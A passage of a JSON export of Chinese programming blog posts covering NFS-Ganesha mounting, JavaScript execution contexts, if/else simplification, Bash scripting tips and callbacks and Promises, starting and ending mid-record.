class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#启动\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl restart nfs-ganesha\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#手动mount的方法\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emount -t nfs -o soft,intr,rsize\u003cspan class=\"o\"\u003e=\u003c/span\u003e8192,wsize\u003cspan class=\"o\"\u003e=\u003c/span\u003e8192,timeo\u003cspan class=\"o\"\u003e=\u003c/span\u003e900,proto\u003cspan class=\"o\"\u003e=\u003c/span\u003etcp,vers\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e4\u003c/span\u003e 192.168.31.2:/upload /mnt/nfs-upload\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#自动mount的方法\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/fstab\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e192.168.31.2:/upload /mnt/nfs-upload nfs rw,vers\u003cspan class=\"o\"\u003e=\u003c/span\u003e4,addr\u003cspan class=\"o\"\u003e=\u003c/span\u003e192.168.31.2,clientaddr\u003cspan class=\"o\"\u003e=\u003c/span\u003e192.168.31.8 \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意id对齐问题可能要用到rpcidmapd\u003c/p\u003e","title":"用户态的NFS Server"},{"content":"JavaScript 到底是如何工作的？ 一、工作原理 JavaScript到底是：\n同步还是异步？ 单线程还是多线程？ JavaScript 中的一切都发生在\nExecution Context （执行上下文）中\n您可以假设这个执行上下文 是一个大盒子或一个容器，在其中执行整个 JavaScript 代码。 这个大盒子里有两个组件： Memory（内存组件）：这是所有变量和函数存储为键值对的地方。这个**“内存组件”也称为变量环境**。因此，它是一种环境，其中所有这些变量和函数都存储为键值对。 Code（代码组件）：这是代码逐行执行的地方。这个“代码组件”也称为执行线程。所以，这个执行线程是一个单线程，整个代码一次只执行一行。 结论：JavaScript 是一种同步单线程语言。\n单线程 意味着 JavaScript 一次只能执行一个命令。 同步单线程 意味着 JavaScript 一次只能以特定顺序每次执行一个命令。这意味着它只能在当前行完成执行后转到下一行。这就是同步单线程的意思。 很惊诧吧，实际 javascripts 有单线程 event loop 大循环来完成很多不可思议的事情。\n二、实际工作过程分析 JavaScript 代码是如何执行的？ 当你运行 JavaScript 代码时会发生什么？\n会创建一个Execution Context（执行上下文）。\n让我们使用实际的代码来举个例子：\nvar n = 2; function square(num) { var ans = num * num; return ans; } var square2 = square(n); var square4 = square(4); 执行上述代码时，会创建 一个执行上下文\n此执行上下文分两个阶段创建：\n一、创建：\n创建阶段也称为内存创建阶段\n。这是一个非常关键的阶段。\n在内存创建的第一阶段，JavaScript 会为所有的变量和函数分配内存。\n首先 JavaScript 遇到var n = 2;，它就会分配内存给n.\n当为n分配内存时，它会先存储一个特殊值undefined。undefined在 JavaScript 中被视为特殊的占位符。\n在遇到 functionsquare(num)时，它也会为这个 function () 分配内存。\n在为 function() 分配内存的情况下，它将该函数的整个代码存储在内存空间中。\n后面为两个变量square2和square4分配了内存，存储的同样是undefined。\n为了完成这个创建阶段，JavaScript 会逐行从上到下遍历扫描代码。\n二、代码执行：\n扫描完毕，现在 JavaScript 再次逐行运行整个程序。 当它遇到时var n = 2;，它实际上将2作为值n放入内存组件中。 当它遇到 的函数定义时square(num)，它没有什么可执行的，所以 JavaScript 简单地跳过了。 当它遇到 时var square2 = square(n);，我们现在正在调用一个函数。 函数是 JavaScript 的核心。它们在 JavaScript 中的行为与在任何其他语言中的行为非常不同。 每当调用一个函数时，都会创建一个全新的Execution Context（执行上下文）。 因此，从技术上讲，在整个**Execution Context 的代码组件中又创建了一个全新的Execution Context ** 。 这个新的内部 Exection Context 执行上下文也有它自己的内存组件和代码组件。 现在在内部发生的事情是： 在这种情况下，有 2 个变量，即num（参数）和ans。 所以内存将分配给num和ans。 在第 1 阶段，与外部执行上下文一样，undefined将分配给num和ans。 现在进入阶段 2（代码执行阶段），参数的值被分配给参数。因此，在我们调用函数的语句var square2 = square(n);时，我们将参数n的值 2 传递给函数square(num)，并且该参数的值替换了内部执行上下文中num的内存组件中的占位符undefined。 计算后num * num，将值存储在 中ans。 在遇到 时return ans;，将存储的值ans返回到调用的位置，并且此内部执行上下文结束。当它结束时，内部执行上下文实际上被删除了。 现在，遇到下一行时遵循相同的过程var square4 = square(4);。 最后一行成功执行后，整个执行上下文也被删除。这种*“整体”*执行上下文也称为全局执行上下文。 那么，JavaScript 是如何管理这种链条式的 ** 执行上下文 ** 的呢？\n它实际上在后台管理一个堆栈。 此堆栈也称为Call Stack（调用堆栈）。 GEC（Global Execution Context 全局执行上下文）始终位于此堆栈的底部。 每当创建一个新的执行上下文时，它就会被压入这个堆栈，并在完成其目的时被弹出。 控件与此调用堆栈的最顶部元素保持一致。 此调用堆栈仅用于管理执行上下文。 在成功执行最后一条语句时，调用堆栈被清空。 调用堆栈维护执行上下文的*执行顺序。*\n给个图更好理解：\n调用堆栈具有以下花哨的名称，也可以通过这些名称来引用它：\nExecution Context Stack（执行上下文堆栈） Program Stack（程序栈） Control Stack（控制堆栈） Runtime Stack（运行时堆栈） Machine Stack（机器堆栈） 这样大家就理解了吧，这样后面的变量提升 Hoisting 就很好理解了。\n","permalink":"https://rendoumi.com/posts/20220621-javascripts_how_to_run/","summary":"\u003ch3 id=\"javascript-到底是如何工作的\"\u003eJavaScript 到底是如何工作的？\u003c/h3\u003e\n\u003ch4 id=\"一工作原理\"\u003e一、工作原理\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003eJavaScript到底是：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cem\u003e\u003cstrong\u003e同步\u003c/strong\u003e还是异步？\u003c/em\u003e\u003c/li\u003e\n\u003cli\u003e\u003cem\u003e\u003cstrong\u003e单线程\u003c/strong\u003e还是多线程？\u003c/em\u003e\u003c/li\u003e\n\u003c/ul\u003e\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eJavaScript 中的一切都发生在\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eExecution Context\u003c/strong\u003e （执行上下文）中\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e您可以假设这个\u003cem\u003e执行上下文\u003c/em\u003e 是一个大盒子或一个容器，在其中执行整个 JavaScript 代码。\u003c/li\u003e\n\u003cli\u003e这个大盒子里有两个组件：\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eMemory（内存组件）：\u003cstrong\u003e这是所有变量和函数存储为\u003c/strong\u003e键值对\u003c/strong\u003e的地方。这个**“内存组件”\u003cstrong\u003e也称为\u003c/strong\u003e变量环境**。因此，它是一种环境，其中所有这些变量和函数都存储为键值对。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCode（代码组件）：\u003cstrong\u003e这是代码逐行执行的地方。这个\u003c/strong\u003e“代码组件”\u003cstrong\u003e也称为\u003c/strong\u003e执行线程\u003c/strong\u003e。所以，这个\u003cstrong\u003e执行线程\u003c/strong\u003e是一个单线程，整个代码一次只执行一行。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e结论：JavaScript 是一种\u003cem\u003e同步单线程\u003c/em\u003e语言。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e单线程\u003c/strong\u003e 意味着 JavaScript 一次只能执行一个命令。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e同步单线程\u003c/strong\u003e 意味着 JavaScript 一次只能以特定顺序每次执行一个命令。这意味着它只能在当前行完成执行后转到下一行。这就是\u003cstrong\u003e同步单线程\u003c/strong\u003e的意思。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e很惊诧吧，实际 javascripts 有单线程 event loop 大循环来完成很多不可思议的事情。\u003c/p\u003e\n\u003ch4 id=\"二实际工作过程分析\"\u003e二、实际工作过程分析\u003c/h4\u003e\n\u003ch4 id=\"javascript-代码是如何执行的\"\u003eJavaScript 代码是如何执行的？\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003e当你运行 JavaScript 代码时会发生什么？\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e会创建一个\u003cstrong\u003eExecution Context（执行上下文）\u003c/strong\u003e。\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e让我们使用实际的代码来举个例子：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003evar n = 2;\nfunction square(num) {\n  var ans = num * num;\n  return ans;\n}\nvar square2 = square(n);\nvar square4 = square(4);\n\u003c/code\u003e\u003c/pre\u003e\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e执行上述代码时，会创建 一个执行上下文\u003c/p\u003e","title":"JavaScript 到底是如何执行的呢 -- JS的作原理"},{"content":"Javascripts 中的 if \u0026hellip; else 用起来倒是很方便，但是看起来就不舒服了\nif (true) { } if (true) { } if (true) { if (true) { if (true) { } } else { } } else { } 上面看起来很闹心吧，下面讲讲优化：\n一、三元优化 if (ture) else可以用三元操作符来优化它：\n// Bad 😥 if (true) { console.log(\u0026#34;Congratutions!\u0026#34;) } else { console.warn(\u0026#34;Oops, something went wrong!\u0026#34;) } // Great 🥰 true ? console.log(\u0026#34;Congratutions\u0026#34;) : console.warn(\u0026#34;Oops, something went wrong!\u0026#34;) 二、与优化 true的情况下才执行可以用与来进行优化：\nif (true) { alert(1) } // is equals to: true \u0026amp;\u0026amp; alert(1) 三、提前返回 如果有多个判断，按照复杂程度，从上到下，提前返回。\nfunction handleRequest(req) { if (req.code \u0026gt;= 500) { return \u0026#34;Server error\u0026#34;; } if (req.code \u0026gt;= 404) { return \u0026#34;Cilent error\u0026#34;; } return \u0026#34;Suceess\u0026#34;; } 四、类表格优化 下面是类似表格似的选择，通常会用 switch 来进行优化\n// Bad 😥 const weekday = (num) =\u0026gt; { if (num === 1) { return \u0026#34;Monday\u0026#34; } else if (num === 2) { return \u0026#34;Tuesday\u0026#34; } else if (num === 3) { return \u0026#34;Wednesday\u0026#34; } else if (num === 4) { return \u0026#34;Thursday\u0026#34; } else if (num === 5) { return \u0026#34;Friday\u0026#34; } else if (num === 6) { return \u0026#34;Saturday\u0026#34; } else if (num === 7) { return \u0026#34;Sunday\u0026#34; } else { return \u0026#34;Unknown\u0026#34; } } console.log(weekday(1)) // Monday switch 也不是最优解，用对象的键值对来解：\nconst weekday = (option) =\u0026gt; { let obj = { 1: \u0026#34;Monday\u0026#34;, 2: \u0026#34;Tuesday\u0026#34;, 3: \u0026#34;Wednesday\u0026#34;, 4: \u0026#34;Thursday\u0026#34;, 5: \u0026#34;Friday\u0026#34;, 6: \u0026#34;Saturday\u0026#34;, 0: \u0026#34;Sunday\u0026#34; } return obj[option] ?? \u0026#34;Unknown\u0026#34; } console.log(weekday(1)) // Monday 也可以用 ES6 的 map 来实现：\n// Great 🥰 const weekday = (num) =\u0026gt; { const map = new Map() .set(1, \u0026#34;Monday\u0026#34;) .set(2, \u0026#34;Tuesday\u0026#34;) .set(3, \u0026#34;Wednesday\u0026#34;) .set(4, \u0026#34;Thursday\u0026#34;) .set(5, \u0026#34;Friday\u0026#34;) .set(6, \u0026#34;Saturday\u0026#34;) .set(7, \u0026#34;Sunday\u0026#34;); return map.has(num) ? map.get(num) : \u0026#34;Unknown\u0026#34;; }; console.log(weekday(1)); 五、选项多对一的数组优化 看如下代码，多个选项对应一个返回：\nconst getContinent = (option) =\u0026gt; { if (option === \u0026#34;China\u0026#34; || option === \u0026#34;Japan\u0026#34;) { return \u0026#34;Asia\u0026#34;; } if (option === \u0026#34;Germany\u0026#34; || option === \u0026#34;France\u0026#34;) { return \u0026#34;Europe\u0026#34;; } }; console.log(getContinent(\u0026#34;China\u0026#34;)); 使用数组来容纳多个选项，然后用 includes 来判断并返回\nconst getContinent = (option) =\u0026gt; { const Asia = [\u0026#34;China\u0026#34;, \u0026#34;Japan\u0026#34;]; const Europe = [\u0026#34;Germany\u0026#34;, \u0026#34;Franch\u0026#34;]; if (Asia.includes(option)) return \u0026#34;Asia\u0026#34;; if (Europe.includes(option)) return \u0026#34;Europe\u0026#34;; return \u0026#34;Unknown\u0026#34;; }; console.log(getContinent(\u0026#34;China\u0026#34;)); // Asia 进一步优化，用 \u0026amp;\u0026amp; 与优化\nconst getContinent = (option) =\u0026gt; { let [result, setResult] = [\u0026#34;unknown\u0026#34;, (str) =\u0026gt; (result = str)]; const Asia = [\u0026#34;China\u0026#34;, \u0026#34;Japan\u0026#34;]; const Europe = [\u0026#34;Germany\u0026#34;, \u0026#34;Franch\u0026#34;]; Asia.includes(option) \u0026amp;\u0026amp; setResult(\u0026#34;Asia\u0026#34;); Europe.includes(option) \u0026amp;\u0026amp; setResult(\u0026#34;Europe\u0026#34;); return result; }; console.log(getContinent(\u0026#34;China\u0026#34;)); ","permalink":"https://rendoumi.com/posts/20220615-javascripts_if/","summary":"\u003cp\u003eJavascripts 中的 if \u0026hellip; else 用起来倒是很方便，但是看起来就不舒服了\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode class=\"language-javascripts\" data-lang=\"javascripts\"\u003eif (true) {\n}\n\nif (true) {\n}\n\nif (true) {\n  if (true) {\n    if (true) {\n    }\n  } else {\n  }\n} else {\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面看起来很闹心吧，下面讲讲优化：\u003c/p\u003e\n\u003ch4 id=\"一三元优化\"\u003e一、三元优化\u003c/h4\u003e\n\u003cp\u003eif (ture) else可以用三元操作符来优化它：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-javascript\" data-lang=\"javascript\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Bad 😥\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Congratutions!\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ewarn\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Oops, something went wrong!\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Great 🥰\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e?\u003c/span\u003e \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Congratutions\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ewarn\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Oops, something went wrong!\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"二与优化\"\u003e二、与优化\u003c/h4\u003e\n\u003cp\u003etrue的情况下才执行可以用与来进行优化：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-javascript\" data-lang=\"javascript\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// is equals to:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kc\"\u003etrue\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003ealert\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"三提前返回\"\u003e三、提前返回\u003c/h4\u003e\n\u003cp\u003e如果有多个判断，按照复杂程度，从上到下，提前返回。\u003c/p\u003e","title":"Javascripts中if的优化"},{"content":"Shell脚本的进阶技巧：\n一、String 类的技巧 String类当作数组来使用，注意范围的下标，0:4，4最后要被踢掉，实际是0-3，共4个字符：\nstring=\u0026#34;Bash is great!\u0026#34; echo ${string:8} # great! echo ${string:0:4} # Bash echo ${string:8:-1} # great (-1: upto 1st element from right) 数组的长度：\nstring=\u0026#34;Bash is great!\u0026#34;; len=${#string} echo \u0026#34;len = $len\u0026#34; 字符串的替换：\nstring=\u0026#34;Bash is great!!\u0026#34; echo ${string/Bash/GNU Bash} # GNU Bash is great!! echo ${string//!/.} # Bash is great.. 大小写替换:\nstring=\u0026#34;Bash\u0026#34; echo ${string^^} # BASH echo ${string,,} # bash 按index存取数组中字符在shell中不可用，但是可以用function变相实现：\nfunction charAt() { string=$1 i=$2 echo ${string:i:1} } echo $(charAt \u0026#34;Hello\u0026#34; 2) # l echo $(charAt \u0026#34;Hello\u0026#34; 1) # e 二、数组和字典 定义一个数组并且遍历它：\nA=(2 4 5 6 4) for i in ${A[@]}; do echo -n \u0026#34;${i} \u0026#34; # 2 4 5 6 4 done 同样对数组进行切割：\nA=(2 4 5 6 4) echo ${A[@]:2:3} # 5 6 4 echo ${A[@]:0:1} # 2 Bash 中的数组需要使用 [@] 符号来引用整个数组，可以用简洁的语法对数组增加元素\nA=(1 2 3) A+=(4) echo ${A[@]} # 1 2 3 4 A+=(5 6) echo ${A[@]} # 1 2 3 4 5 6 字典也一样\ndeclare -A D D=([\u0026#34;one\u0026#34;]=1 [\u0026#34;two\u0026#34;]=2 [\u0026#34;three\u0026#34;]=3) for i in ${!D[@]}; do echo \u0026#34;$i -\u0026gt; ${D[$i]}\u0026#34; # one -\u0026gt; 1 .... done 三、数学计算 简单的数学计算可以用 $((...)) 来完成：\na=10 b=5 echo \u0026#34;$a + $b = $((a + b))\u0026#34; # 10 + 5 = 15 echo \u0026#34;$a - $b = $((a - b))\u0026#34; # 10 - 5 = 5 echo \u0026#34;$a x $b = $((a * b))\u0026#34; # 10 x 5 = 50 echo \u0026#34;$a / $b = $((a / b))\u0026#34; # 10 / 5 = 2 echo \u0026#34;$a % $b = $((a % b))\u0026#34; # 10 % 5 = 0 或者借助复杂一点的 bc 来完成：\na=10 b=5.7 echo \u0026#34;$a / $b = $(echo \u0026#34;scale = 2; $a / $b\u0026#34; | bc)\u0026#34; # 10 / 5.7 = 1.75 随机数的产生：\necho $(($RANDOM % 10)) # Random number between 0 and 10 四、输入 控制输入变量：\nread -p \u0026#34;Enter your name: \u0026#34; name echo \u0026#34;Hello, $name\u0026#34; 如果要输入数组：\nread -p \u0026#34;Enter numbers: \u0026#34; -a A echo ${A[@]} 借助上面的技巧，我们可以写出一些复杂的 shell 脚本了\n","permalink":"https://rendoumi.com/posts/20220609-shell_tips/","summary":"\u003cp\u003eShell脚本的进阶技巧：\u003c/p\u003e\n\u003ch4 id=\"一string-类的技巧\"\u003e一、String 类的技巧\u003c/h4\u003e\n\u003cp\u003eString类当作数组来使用，注意范围的下标，0:4，4最后要被踢掉，实际是0-3，共4个字符：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003estring=\u0026#34;Bash is great!\u0026#34;\n\necho ${string:8} # great!\necho ${string:0:4} # Bash\necho ${string:8:-1} # great (-1: upto 1st element from right)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e数组的长度：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003estring=\u0026#34;Bash is great!\u0026#34;;\nlen=${#string}\necho \u0026#34;len = $len\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e字符串的替换：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003estring=\u0026#34;Bash is great!!\u0026#34;\necho ${string/Bash/GNU Bash} # GNU Bash is great!!\necho ${string//!/.} # Bash is great..\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e大小写替换:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003estring=\u0026#34;Bash\u0026#34;\necho ${string^^} # BASH\necho ${string,,} # bash\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e按index存取数组中字符在shell中不可用，但是可以用function变相实现：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003efunction charAt() {\n    string=$1\n    i=$2\n    echo ${string:i:1}\n}\necho $(charAt \u0026#34;Hello\u0026#34; 2) # l\necho $(charAt \u0026#34;Hello\u0026#34; 1) # e\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 id=\"二数组和字典\"\u003e二、数组和字典\u003c/h4\u003e\n\u003cp\u003e定义一个数组并且遍历它：\u003c/p\u003e","title":"Shell进阶技巧"},{"content":"一、基本概念\n1. 异步\n所谓 \u0026quot; 异步 \u0026ldquo;，简单说就是一个任务分成两段， 先执行第一段， 然后转而执行其他任务去， 等做好了准备， 再回过头执行第二段。\n比如， 有一个任务是读取文件进行处理， 任务的第一段是向操作系统发出请求， 要求读取文件。 然后， 程序执行其他任务， 等到操作系统返回文件，再接着执行任务的第二段（ 处理文件）。 这种不连续的执行， 就叫做异步。\n相应地， 连续的执行就叫做同步。 由于是连续执行， 不能插入其他任务， 所以操作系统从硬盘读取文件的这段时间， 程序只能干等着什么也做不了。\n2. 回调函数\njavascript 语言对异步编程的实现， 就是回调函数。 所谓回调函数， 就是把任务的第二段单独写在一个函数里面， 等到准备好了，继续执行的时候， 就直接调用这个函数。 它的英语名字 callback， 直译过来就是 \u0026quot; 回调 \u0026ldquo;。\n读取文件进行处理， 是这样的，readfile 是异步的，readfileSync 是同步的。\nfs.readfile(\u0026#39;/etc/passwd\u0026#39;, function(err, data) { if(err) throw err; console.log(data); }); 上面代码中， readfile 函数的第二个参数， 就是回调函数， 也就是任务的第二段。 等到操作系统返回了 / etc / passwd这个文件以后， 回调函数才会执行。\n==一个有趣的问题是， 为什么 node.js 约定， 回调函数的第一个参数， 必须是错误对象 err（ 如果没有错误， 该参数就是 null）？ 原因是执行分成两段， 在这两段之间抛出的错误， 程序无法捕捉， 只能当作参数， 传入第二段。==\n3. promise\n“想像一下你是个小孩，你妈妈 promise 承诺你下星期给你一部新手机”\n只有下周来临的时候，你才会知道你真的得到一部手机，或者是骗你玩的。\n这就是 promise. 一个 promise 有三种状态：\nPending: 待定，你不知道你是否能得到一部手机 Resolved: 妈妈很高兴，你得到一部手机 Rejected: 妈妈不高兴，你没有得到一部手机 状态图如下：\n语法很简单：\n// promise syntax look like this new Promise(function (resolve, reject) { ... } ); 再看一下上面问题的解决方法：\n首先确定 Mom 的状态是 unhappy，然后建立一个 Promise 来确定是否得到手机，最后用一个函数 askMom 来调用这个 Promise\nresolve() 中可以放置一个参数用于向下一个 then 传递一个值，then 中的函数也可以返回一个值传递给 then。但是，如果 then 中返回的是一个 Promise 对象，那么下一个 then 将相当于对这个返回的 Promise 进行操作。\nreject() 参数中一般会传递一个异常给之后的 catch 函数用于处理异常。\n但是请注意以下两点：\nresolve 和 reject 的作用域只有起始函数，不包括 then 以及其他序列； resolve 和 reject 并不能够使起始函数停止运行，别忘了 return。 var isMomHappy = false; // Promise var willIGetNewPhone = new Promise( function (resolve, reject) { if (isMomHappy) { var phone = { brand: \u0026#39;Samsung\u0026#39;, color: \u0026#39;black\u0026#39; }; resolve(phone); // resolved } else { var reason = new Error(\u0026#39;mom is not happy\u0026#39;); reject(reason); // rejected } } ); var askMom = function () { willIGetNewPhone .then(function (fulfilled) { // yay, you got a new phone console.log(fulfilled); // output: { brand: \u0026#39;Samsung\u0026#39;, color: \u0026#39;black\u0026#39; } }) .catch(function (error) { // oops, mom didn\u0026#39;t buy it console.log(error.message); // output: \u0026#39;mom is not happy\u0026#39; }); }; askMom(); 很有点意思吧。抽象了，那就实际点。\njavascripts 中的 fetch 函数就是基于Promise范式的，promise 的 resolves 绑在了 Response 上。Promise 类有 .then() .catch() 和 .finally() 三个方法，这三个方法的参数都是一个函数，.then() 可以将参数中的函数添加到当前 Promise 的正常执行序列，.catch() 则是设定 Promise 的异常处理序列，.finally() 是在 Promise 执行的最后一定会执行的序列。 .then() 传入的函数会按顺序依次执行，有任何异常都会直接跳到 catch 序列：\nfetch(\u0026#34;http://192.168.1.6/graph_image_hubot.php?action=view\u0026amp;local_graph_id=13619\u0026amp;rra_id=5\u0026#34;) .then(response =\u0026gt; { if (response.ok) { return response.buffer(); } throw new Error(\u0026#39;Network response was not ok.\u0026#39;); }) .then(buffer =\u0026gt; { const formData = new 